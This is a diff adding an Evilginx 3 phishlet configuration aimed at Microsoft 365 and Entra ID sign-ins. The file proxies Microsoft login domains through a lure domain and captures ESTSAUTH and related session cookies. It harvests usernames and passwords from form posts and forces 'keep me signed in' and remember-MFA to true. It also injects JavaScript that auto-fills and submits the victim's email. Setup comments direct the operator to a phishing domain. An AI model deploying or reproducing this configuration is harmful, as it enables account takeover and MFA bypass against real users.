@@ -1,0 +1,96 @@
+# Evilginx 3.3.0 community — Microsoft 365 / Entra ID
+#
+# Orig hosts (login.microsoftonline.com, office.com, live.com, …) stay as-is.
+# They are Microsoft's, not the client.
+#
+# Lure / phish domain — replace EXAMPLE with your phishing parent domain:
+#   phishlets hostname microsoft EXAMPLE.com
+# Landing: https://login.EXAMPLE.com/<lure>
+#
+# Do not leave backup files (microsoft.yaml.bak*) in this directory.
+
+name: 'microsoft'
+author: 'marcocarolasec'
+min_ver: '3.0.0'
+redirect_url: 'https://www.microsoft.com/'
+
+proxy_hosts:
+  - { phish_sub: "login",   orig_sub: "login",       domain: "microsoftonline.com", session: true,  is_landing: true,  auto_filter: true }
+  - { phish_sub: "www",     orig_sub: "www",         domain: "office.com",          session: true,  is_landing: false, auto_filter: true }
+  - { phish_sub: "live",    orig_sub: "login",       domain: "live.com",            session: true,  is_landing: false, auto_filter: true }
+  - { phish_sub: "account", orig_sub: "account",     domain: "live.com",            session: true,  is_landing: false, auto_filter: true }
+  - { phish_sub: "acc",     orig_sub: "account",     domain: "microsoft.com",       session: true,  is_landing: false, auto_filter: true }
+  - { phish_sub: "ssl",     orig_sub: "compass-ssl", domain: "microsoft.com",       session: false, is_landing: false, auto_filter: true }
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH:always', 'ESTSAUTHPERSISTENT:opt', 'SignInStateCookie:opt']
+    type: 'cookie'
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSAUTH:always', 'ESTSAUTHPERSISTENT:opt']
+    type: 'cookie'
+  - domain: 'login.live.com'
+    keys: ['__Host-MSAAUTHP:always']
+    type: 'cookie'
+  - domain: '.live.com'
+    keys: ['RPSSecAuth:opt', 'MSPAuth:opt']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: '(login|UserName|username|email|account)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/ppsecure/post.*'
+    search:
+      - { key: 'login', search: '.+' }
+    force:
+      - { key: 'LoginOptions', value: '1' }
+    type: 'post'
+  - path: '/kmsi'
+    search:
+      - { key: 'LoginOptions', search: '.*' }
+    force:
+      - { key: 'LoginOptions', value: '1' }
+    type: 'post'
+  - path: '/common/SAS'
+    search:
+      - { key: 'rememberMFA', search: '.*' }
+    force:
+      - { key: 'rememberMFA', value: 'true' }
+    type: 'post'
+  - path: '/common/SAS/ProcessAuth'
+    search:
+      - { key: 'rememberMFA', search: '.*' }
+    force:
+      - { key: 'rememberMFA', value: 'true' }
+    type: 'post'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+js_inject:
+  - trigger_domains: ['login.microsoftonline.com', 'login.live.com']
+    trigger_paths: ['/', '/login.srf*', '/common/login*', '/common/oauth2*', '/oauth20*', '/ppsecure/*']
+    script: |
+      function lp(){
+        var emailId = document.querySelector("#i0116");
+        var nextButton = document.querySelector("#idSIButton9");
+        var query = window.location.href;
+        if (/#/.test(query) && emailId != null) {
+          var data2 = query.split("#")[1];
+          emailId.focus();
+          emailId.value = data2.replace(/=/gi, '');
+          if (nextButton) { nextButton.focus(); nextButton.click(); }
+          return;
+        }
+        setTimeout(function(){ lp(); }, 1500);
+      }
+      setTimeout(function(){ lp(); }, 1500);
